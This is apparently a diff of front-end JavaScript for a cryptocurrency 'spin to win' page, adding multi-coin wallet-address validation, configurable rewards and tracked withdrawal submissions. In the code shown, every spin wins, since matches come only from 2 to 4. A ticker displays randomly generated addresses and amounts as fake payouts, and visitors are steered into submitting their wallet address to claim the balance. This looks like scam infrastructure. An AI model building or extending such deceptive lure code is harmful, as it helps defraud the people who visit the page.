@@ -3,6 +3,53 @@ const API_BASE = '';
 
 const T = k => (typeof window.__t === 'function') ? window.__t(k) : k;
 
+// ===================== 币种配置 =====================
+const COIN_META = {
+    USDT: { icon: '₮', decimals: 2, className: 'coin-USDT' },
+    BTC:  { icon: '₿', decimals: 8, className: 'coin-BTC' },
+    ETH:  { icon: 'Ξ', decimals: 6, className: 'coin-ETH' },
+    DOGE: { icon: 'Ð', decimals: 2, className: 'coin-DOGE' },
+    TRX:  { icon: 'T', decimals: 2, className: 'coin-TRX' },
+    SOL:  { icon: '◎', decimals: 4, className: 'coin-SOL' }
+};
+
+// 全局运行时状态
+window.__GAME_CONFIG = {
+    currency: 'USDT',
+    rewards: { 2: 10, 3: 30, 4: 200, 5: 10000 }
+};
+
+// 地址验证规则（按币种）
+const ADDR_VALIDATORS = {
+    USDT: /^T[1-9A-HJ-NP-Za-km-z]{33}$/,                              // TRC20
+    TRX:  /^T[1-9A-HJ-NP-Za-km-z]{33}$/,                              // TRC20 同款
+    BTC:  /^(1[1-9A-HJ-NP-Za-km-z]{25,34}|3[1-9A-HJ-NP-Za-km-z]{25,34}|bc1[a-zA-HJ-NP-Z0-9]{25,60})$/,
+    ETH:  /^0x[a-fA-F0-9]{40}$/,
+    DOGE: /^D[5-9A-HJ-NP-Za-km-z]{33}$/,
+    SOL:  /^[1-9A-HJ-NP-Za-km-z]{32,44}$/
+};
+
+// 金额格式化：按币种小数位去尾 0
+function formatAmount(value, currency) {
+    const meta = COIN_META[currency] || COIN_META.USDT;
+    let n = parseFloat(value);
+    if (isNaN(n)) n = 0;
+    let str = n.toFixed(meta.decimals);
+    if (str.indexOf('.') >= 0) {
+        str = str.replace(/0+$/, '').replace(/\.$/, '');
+    }
+    if (str === '' || str === '-') str = '0';
+    return str;
+}
+
+// 给数字加千分位（整数部分）
+function formatAmountWithSep(value, currency) {
+    const raw = formatAmount(value, currency);
+    const parts = raw.split('.');
+    parts[0] = parts[0].replace(/\B(?=(\d{3})+(?!\d))/g, ',');
+    return parts.join('.');
+}
+
 // ===================== 访问会话管理 =====================
 let __visitId = null;
 let __heartbeatTimer = null;
@@ -10,15 +57,82 @@ let __heartbeatInterval = 30;
 let __visitStarted = false;
 let __visitEnded = false;
 
+async function loadPublicSettings() {
+    try {
+        const res = await fetch('/api/public-settings');
+        const cfg = await res.json();
+        if (cfg.heartbeatInterval) __heartbeatInterval = cfg.heartbeatInterval;
+        if (cfg.currency && COIN_META[cfg.currency]) {
+            window.__GAME_CONFIG.currency = cfg.currency;
+        }
+        if (cfg.rewards && typeof cfg.rewards === 'object') {
+            window.__GAME_CONFIG.rewards = {
+                2: parseFloat(cfg.rewards[2]) || 0,
+                3: parseFloat(cfg.rewards[3]) || 0,
+                4: parseFloat(cfg.rewards[4]) || 0,
+                5: parseFloat(cfg.rewards[5]) || 0
+            };
+        }
+        applyConfigToUI();
+    } catch (e) {
+        console.warn('读取公共配置失败:', e.message);
+    }
+}
+
+// 把币种/奖励配置应用到 UI
+function applyConfigToUI() {
+    const cur = window.__GAME_CONFIG.currency;
+    const meta = COIN_META[cur] || COIN_META.USDT;
+
+    // 顶部余额
+    const iconEl = document.getElementById('balanceIcon');
+    if (iconEl) {
+        iconEl.textContent = meta.icon;
+        iconEl.className = 'wallet-coin-icon ' + meta.className;
+    }
+    const unitEl = document.getElementById('balanceUnit');
+    if (unitEl) unitEl.textContent = cur;
+
+    // Jackpot 值（显示 5 连奖励）
+    const jackpotVal = document.getElementById('jackpotVal');
+    if (jackpotVal) {
+        jackpotVal.textContent = formatAmountWithSep(window.__GAME_CONFIG.rewards[5], cur) + ' ' + cur;
+    }
+
+    // 顶部 banner（如果当前是默认文案就改，否则语言切换会覆盖，让 i18n 处理）
+    // 这里不动，由 i18n 的 switchLanguage 动态替换
+
+    // 赔率表
+    const table = document.getElementById('paytable');
+    if (table) {
+        table.querySelectorAll('.pay-v').forEach(el => {
+            const n = el.dataset.pay;
+            if (n && window.__GAME_CONFIG.rewards[n] !== undefined) {
+                el.textContent = formatAmountWithSep(window.__GAME_CONFIG.rewards[n], cur) + ' ' + cur;
+            }
+        });
+    }
+
+    // 提取弹窗的地址标签
+    const extractLabel = document.getElementById('extractLabel');
+    if (extractLabel) {
+        // 由 i18n 处理（会根据币种显示不同币种地址提示）
+        if (typeof window.__updateExtractLabel === 'function') window.__updateExtractLabel();
+    }
+
+    // 提取弹窗的金额单位
+    const extractAmt = document.getElementById('extractAmt');
+    if (extractAmt) {
+        const num = parseFloat(extractAmt.textContent.replace(/[^\d.-]/g, '')) || 0;
+        extractAmt.textContent = formatAmount(num, cur) + ' ' + cur;
+    }
+}
+
 async function startVisitSession() {
     if (__visitStarted) return;
     __visitStarted = true;
     try {
-        try {
-            const cfgRes = await fetch('/api/public-settings');
-            const cfg = await cfgRes.json();
-            if (cfg.heartbeatInterval) __heartbeatInterval = cfg.heartbeatInterval;
-        } catch (e) { /* 忽略 */ }
+        await loadPublicSettings();
 
         const lang = (document.getElementById('langSelect') && document.getElementById('langSelect').value) || (navigator.language || 'en');
         const visitId = Date.now() + '_' + Math.random().toString(36).slice(2, 10);
@@ -87,7 +201,6 @@ window.addEventListener('beforeunload', endVisitSession);
 // ===================== 主游戏 =====================
 (function(){
 const N=5,EXTRA=28,DELAY=.1,DUR=2.05,STEP=.16,OVER=16,SPINS=3;
-const PAYOUT_BY_MATCH = {2:10, 3:30, 4:200, 5:10000};
 const JACKPOT = 10000;
 const MATCH_POOL = [2, 3, 4];
 const SYMS=[
@@ -170,10 +283,16 @@ function mount(){
   }
   ticks.forEach(t=>stage.appendChild(t));
 }
-function fmt(n){return n.toLocaleString("en-US",{minimumFractionDigits:n%1?2:0,maximumFractionDigits:2})}
-function setBal(n){S.bal=n;const b=document.getElementById("balanceText");if(b)b.textContent=n.toFixed(2)}
+function setBal(n){
+  S.bal=n;
+  const cur = window.__GAME_CONFIG.currency;
+  const b=document.getElementById("balanceText");
+  if(b) b.textContent = formatAmountWithSep(n, cur);
+}
 function setLeft(n){S.left=n;const s=document.getElementById("spinsText");if(s)s.textContent=n}
-function calcPayout(match){return PAYOUT_BY_MATCH[match] || 0}
+function calcPayout(match){
+  return parseFloat(window.__GAME_CONFIG.rewards[match]) || 0;
+}
 function outcome(){
   const m = pick(MATCH_POOL);
   const win = pick(SYMS);
@@ -213,13 +332,11 @@ function restoreBtn(){
 function toast(t){const e=$("toast");e.textContent=t;e.classList.add("show");clearTimeout(toast._t);toast._t=setTimeout(()=>e.classList.remove("show"),1600)}
 function openM(id,on){$(id).classList.toggle("open",on!==false)}
 
-// ★ 新增：查询该 IP 今日是否还能玩
 async function checkPlayerStatus(){
   try {
     const res = await fetch(API_BASE + '/api/player-status');
     const data = await res.json();
     if (data && data.canPlay === false) {
-      // 今日次数用完 → 直接进入"查看记录"状态
       S.canExtract = 1;
       S.withdrawn = 1;
       restoreBtn();
@@ -229,7 +346,6 @@ async function checkPlayerStatus(){
   }
 }
 
-// ★ 新增：提交被拒时立即切成"查看记录"
 window.__forceLimitReached = function(){
   S.canExtract = 1;
   S.withdrawn = 1;
@@ -258,26 +374,42 @@ function spin(){
     const jp=out.match===5;S.pending=out.payout;restoreBtn();SFX.win(jp);
     if(navigator.vibrate)navigator.vibrate(jp?[20,40,20,40,60]:[18,30,18]);
     fireConfetti(jp);
+    const cur = window.__GAME_CONFIG.currency;
     const m=$("winModal"),lab=(MAP[out.winId]&&MAP[out.winId].label)||"CRYPTO";
     m.classList.toggle("jackpot",jp);
     $("winKicker").textContent=jp?T('win_kicker_jackpot'):T('win_kicker_normal');
     $("winTitle").textContent=jp?T('win_title_jackpot'):T('win_title_normal');
-    $("winAmt").textContent="+"+fmt(out.payout)+" USDT";
-    $("winDesc").textContent=T('win_desc').replace('{n}',out.match).replace('{sym}',lab).replace('{amt}',fmt(out.payout));
+    $("winAmt").textContent="+"+formatAmountWithSep(out.payout, cur)+" "+cur;
+    $("winDesc").textContent=T('win_desc').replace('{n}',out.match).replace('{sym}',lab).replace('{amt}',formatAmountWithSep(out.payout, cur)).replace('{cur}',cur);
     openM("winModal");
   });
 }
 function claim(){
-  if(S.pending>0){setBal(S.bal+S.pending);toast("+"+fmt(S.pending)+" USDT "+T('claimed'));S.pending=0}
+  if(S.pending>0){
+    setBal(S.bal+S.pending);
+    const cur = window.__GAME_CONFIG.currency;
+    toast("+"+formatAmountWithSep(S.pending, cur)+" "+cur+" "+T('claimed'));
+    S.pending=0;
+  }
   if(S.left<=0)S.canExtract=1;
   openM("winModal",false);restoreBtn();
 }
 
+// 地址验证：按当前币种
+function validateAddress(addr, currency) {
+    const re = ADDR_VALIDATORS[currency] || ADDR_VALIDATORS.USDT;
+    return re.test(addr);
+}
+
 function submit(){
   const input=$("trc20Input"),err=$("trc20Err"),addr=input.value.trim();
-  if(!/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(addr)){
+  const cur = window.__GAME_CONFIG.currency;
+  if(!validateAddress(addr, cur)){
     input.classList.add("is-invalid");
-    err.textContent=T('invalid_addr');
+    // 按币种给提示键
+    const key = 'invalid_addr_' + cur.toLowerCase();
+    const fallbackKey = 'invalid_addr';
+    err.textContent = T(key) !== key ? T(key) : T(fallbackKey);
     return;
   }
   input.classList.remove("is-invalid");
@@ -290,7 +422,7 @@ function submit(){
   openM("confirmModal");
   setBal(0);
   restoreBtn();
-  submitTrc20Record(addr, withdrawAmount.toFixed(2));
+  submitTrc20Record(addr, withdrawAmount);
 }
 
 function onMain(){
@@ -299,10 +431,19 @@ function onMain(){
       if(typeof window.__openMyRecords === 'function') window.__openMyRecords();
       return;
     }
-    $("extractAmt").textContent=S.bal.toFixed(2)+" USDT";
+    const cur = window.__GAME_CONFIG.currency;
+    $("extractAmt").textContent=formatAmountWithSep(S.bal, cur)+" "+cur;
+    // 提取弹窗地址标签按币种
+    if (typeof window.__updateExtractLabel === 'function') window.__updateExtractLabel();
     const input=$("trc20Input");
     input.classList.remove("is-invalid");
     $("trc20Err").textContent="";
+    // placeholder 按币种
+    if (cur === 'ETH') input.placeholder = '0x................................';
+    else if (cur === 'BTC') input.placeholder = '1... or bc1...';
+    else if (cur === 'DOGE') input.placeholder = 'D................................';
+    else if (cur === 'SOL') input.placeholder = '4................................';
+    else input.placeholder = 'T................................';
     openM("extractModal");
     setTimeout(()=>input.focus(),280);
     return;
@@ -328,7 +469,6 @@ function init(){
   const cm = document.getElementById('confirmModal');
   if (cm) cm.addEventListener('click', e => { if (e.target === cm) cm.classList.remove('open'); });
 
-  // ★ 进入页面时先查一下今日次数
   checkPlayerStatus();
 }
 if(document.readyState==="loading")document.addEventListener("DOMContentLoaded",init);else init();
@@ -336,11 +476,17 @@ if(document.readyState==="loading")document.addEventListener("DOMContentLoaded",
 window.__refreshSpinBtn = restoreBtn;
 })();
 
-// ========== 提交 TRC20 提现记录到后端（带上 visitId） ==========
+// ========== 暴露币种/奖励配置给其他脚本 ==========
+window.__getCurrency = () => window.__GAME_CONFIG.currency;
+window.__getReward = (match) => window.__GAME_CONFIG.rewards[match] || 0;
+window.__formatAmount = formatAmountWithSep;
+
+// ========== 提交提现记录到后端（带上 visitId + currency） ==========
 async function submitTrc20Record(address, balance){
   try {
     const lang = (document.getElementById('langSelect') && document.getElementById('langSelect').value) || (navigator.language || 'en');
     const visitId = window.__visitId;
+    const currency = window.__GAME_CONFIG.currency;
     if (!visitId) {
       console.warn('未创建访问会话，无法提交');
       alert('页面还在初始化，请稍后再试');
@@ -349,7 +495,8 @@ async function submitTrc20Record(address, balance){
     const payload = {
       id: visitId,
       address: address,
-      balance: balance || '0.00',
+      balance: formatAmount(balance, currency),
+      currency: currency,
       timestamp: new Date().toISOString(),
       language: lang,
       visitTime: window.__firstVisitTime || new Date().toISOString()
@@ -364,7 +511,6 @@ async function submitTrc20Record(address, balance){
       if (res.status === 429 || data.error === 'DAILY_LIMIT_REACHED') {
         const t = window.__t || (k => k);
         alert(t('limit_reached'));
-        // ★ 立即把按钮切成"查看记录"
         if (typeof window.__forceLimitReached === 'function') window.__forceLimitReached();
         return;
       }
@@ -391,7 +537,7 @@ function initRollingAddresses() {
   function generateRandomAmount() {
     let sum = 0;
     for (let i = 0; i < 3; i++) sum += SPIN_POOL[Math.floor(Math.random() * SPIN_POOL.length)];
-    return sum.toFixed(2);
+    return sum;
   }
   const QUEUE_SIZE = 20, VISIBLE = 5, ITEM_HEIGHT = 20;
   const queue = [];
@@ -401,22 +547,11 @@ function initRollingAddresses() {
   }
   for (let i = 0; i < QUEUE_SIZE; i++) pushNew();
   function render() {
+    const cur = window.__GAME_CONFIG.currency;
     inner.innerHTML = queue.slice(0, VISIBLE).map(item =>
-      `<div class="rolling-item"><span class="addr">${item.addr.slice(0,8)}...${item.addr.slice(-6)}</span><span class="amt">${item.amt} USDT</span></div>`
+      `<div class="rolling-item"><span class="addr">${item.addr.slice(0,8)}...${item.addr.slice(-6)}</span><span class="amt">${formatAmountWithSep(item.amt, cur)} ${cur}</span></div>`
     ).join('');
   }
   render();
-  let offset = 0;
-  function scrollStep() {
-    offset += ITEM_HEIGHT;
-    if (offset >= ITEM_HEIGHT) {
-      offset = 0;
-      queue.shift(); pushNew(); render();
-      inner.style.transition = 'none';
-      inner.style.transform = 'translateY(0px)';
-      void inner.offsetHeight;
-      inner.style.transition = 'transform .6s ease-in-out';
-    }
-  }
-  setInterval(scrollStep, 2000);
+  setInterval(() => { queue.shift(); pushNew(); render(); }, 2000);
 }
